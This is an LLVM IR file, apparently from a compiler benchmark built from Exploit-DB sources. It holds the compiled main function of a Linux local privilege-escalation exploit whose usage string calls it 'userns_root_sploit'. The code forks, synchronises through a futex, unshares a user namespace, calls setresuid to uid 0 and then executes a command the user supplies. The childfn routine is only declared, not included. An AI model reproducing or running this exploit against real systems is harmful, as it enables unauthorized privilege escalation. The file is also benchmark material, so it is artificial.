; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_25450.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_25450.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [107 x i8] c"usage: userns_root_sploit COMMAND ARGS...\0A\0AThis will run a command as (global) uid 0 but no capabilities.\0A\00", align 1
@PROT_READ = common dso_local global i32 0, align 4
@PROT_WRITE = common dso_local global i32 0, align 4
@MAP_SHARED = common dso_local global i32 0, align 4
@MAP_ANONYMOUS = common dso_local global i32 0, align 4
@ftx = common dso_local global i32* null, align 8
@MAP_FAILED = common dso_local global i32* null, align 8
@.str.1 = private unnamed_addr constant [5 x i8] c"mmap\00", align 1
@parent = common dso_local global i32 0, align 4
@SIGCHLD = common dso_local global i32 0, align 4
@SIG_DFL = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [7 x i8] c"signal\00", align 1
@.str.3 = private unnamed_addr constant [5 x i8] c"fork\00", align 1
@SYS_futex = common dso_local global i32 0, align 4
@FUTEX_WAKE = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [6 x i8] c"futex\00", align 1
@CLONE_NEWUSER = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [23 x i8] c"unshare(CLONE_NEWUSER)\00", align 1
@.str.6 = private unnamed_addr constant [5 x i8] c"wait\00", align 1
@.str.7 = private unnamed_addr constant [13 x i8] c"child failed\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"setresuid\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %9 = load i32, i32* %4, align 4
  %10 = icmp slt i32 %9, 2
  br i1 %10, label %11, label %13

11:                                               ; preds = %2
  %12 = call i32 @printf(i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %92

13:                                               ; preds = %2
  %14 = load i32, i32* @PROT_READ, align 4
  %15 = load i32, i32* @PROT_WRITE, align 4
  %16 = or i32 %14, %15
  %17 = load i32, i32* @MAP_SHARED, align 4
  %18 = load i32, i32* @MAP_ANONYMOUS, align 4
  %19 = or i32 %17, %18
  %20 = call i32* @mmap(i32 0, i32 4, i32 %16, i32 %19, i32 -1, i32 0)
  store i32* %20, i32** @ftx, align 8
  %21 = load i32*, i32** @ftx, align 8
  %22 = load i32*, i32** @MAP_FAILED, align 8
  %23 = icmp eq i32* %21, %22
  br i1 %23, label %24, label %26

24:                                               ; preds = %13
  %25 = call i32 @err(i32 1, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0))
  br label %26

26:                                               ; preds = %24, %13
  %27 = call i32 (...) @getpid()
  store i32 %27, i32* @parent, align 4
  %28 = load i32, i32* @SIGCHLD, align 4
  %29 = load i32, i32* @SIG_DFL, align 4
  %30 = call i64 @signal(i32 %28, i32 %29)
  %31 = icmp ne i64 %30, 0
  br i1 %31, label %32, label %34

32:                                               ; preds = %26
  %33 = call i32 @err(i32 1, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i64 0, i64 0))
  br label %34

34:                                               ; preds = %32, %26
  %35 = call i32 (...) @fork()
  store i32 %35, i32* %8, align 4
  %36 = load i32, i32* %8, align 4
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %38, label %40

38:                                               ; preds = %34
  %39 = call i32 @err(i32 1, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i64 0, i64 0))
  br label %40

40:                                               ; preds = %38, %34
  %41 = load i32, i32* %8, align 4
  %42 = icmp eq i32 %41, 0
  br i1 %42, label %43, label %45

43:                                               ; preds = %40
  %44 = call i32 (...) @childfn()
  store i32 %44, i32* %3, align 4
  br label %92

45:                                               ; preds = %40
  %46 = load i32*, i32** @ftx, align 8
  store i32 1, i32* %46, align 4
  %47 = load i32, i32* @SYS_futex, align 4
  %48 = load i32*, i32** @ftx, align 8
  %49 = load i32, i32* @FUTEX_WAKE, align 4
  %50 = call i64 @syscall(i32 %47, i32* %48, i32 %49, i32 1, i32 0, i32 0, i32 0)
  %51 = icmp ne i64 %50, 0
  br i1 %51, label %52, label %54

52:                                               ; preds = %45
  %53 = call i32 @err(i32 1, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i64 0, i64 0))
  br label %54

54:                                               ; preds = %52, %45
  %55 = load i32, i32* @CLONE_NEWUSER, align 4
  %56 = call i64 @unshare(i32 %55)
  %57 = icmp ne i64 %56, 0
  br i1 %57, label %58, label %60

58:                                               ; preds = %54
  %59 = call i32 @err(i32 1, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.5, i64 0, i64 0))
  br label %60

60:                                               ; preds = %58, %54
  %61 = call i32 @wait(i32* %7)
  %62 = load i32, i32* %8, align 4
  %63 = icmp ne i32 %61, %62
  br i1 %63, label %64, label %66

64:                                               ; preds = %60
  %65 = call i32 @err(i32 1, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i64 0, i64 0))
  br label %66

66:                                               ; preds = %64, %60
  %67 = load i32, i32* %7, align 4
  %68 = call i32 @WIFEXITED(i32 %67)
  %69 = icmp ne i32 %68, 0
  br i1 %69, label %70, label %74

70:                                               ; preds = %66
  %71 = load i32, i32* %7, align 4
  %72 = call i64 @WEXITSTATUS(i32 %71)
  %73 = icmp ne i64 %72, 0
  br i1 %73, label %74, label %76

74:                                               ; preds = %70, %66
  %75 = call i32 @errx(i32 1, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.7, i64 0, i64 0))
  br label %76

76:                                               ; preds = %74, %70
  %77 = call i64 @setresuid(i32 0, i32 0, i32 0)
  %78 = icmp ne i64 %77, 0
  br i1 %78, label %79, label %81

79:                                               ; preds = %76
  %80 = call i32 @err(i32 1, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i64 0, i64 0))
  br label %81

81:                                               ; preds = %79, %76
  %82 = load i8**, i8*** %5, align 8
  %83 = getelementptr inbounds i8*, i8** %82, i64 1
  %84 = load i8*, i8** %83, align 8
  %85 = load i8**, i8*** %5, align 8
  %86 = getelementptr inbounds i8*, i8** %85, i64 1
  %87 = call i32 @execvp(i8* %84, i8** %86)
  %88 = load i8**, i8*** %5, align 8
  %89 = getelementptr inbounds i8*, i8** %88, i64 1
  %90 = load i8*, i8** %89, align 8
  %91 = call i32 @err(i32 1, i8* %90)
  store i32 0, i32* %3, align 4
  br label %92

92:                                               ; preds = %81, %43, %11
  %93 = load i32, i32* %3, align 4
  ret i32 %93
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i32* @mmap(i32, i32, i32, i32, i32, i32) #1

declare dso_local i32 @err(i32, i8*) #1

declare dso_local i32 @getpid(...) #1

declare dso_local i64 @signal(i32, i32) #1

declare dso_local i32 @fork(...) #1

declare dso_local i32 @childfn(...) #1

declare dso_local i64 @syscall(i32, i32*, i32, i32, i32, i32, i32) #1

declare dso_local i64 @unshare(i32) #1

declare dso_local i32 @wait(i32*) #1

declare dso_local i32 @WIFEXITED(i32) #1

declare dso_local i64 @WEXITSTATUS(i32) #1

declare dso_local i32 @errx(i32, i8*) #1

declare dso_local i64 @setresuid(i32, i32, i32) #1

declare dso_local i32 @execvp(i8*, i8**) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
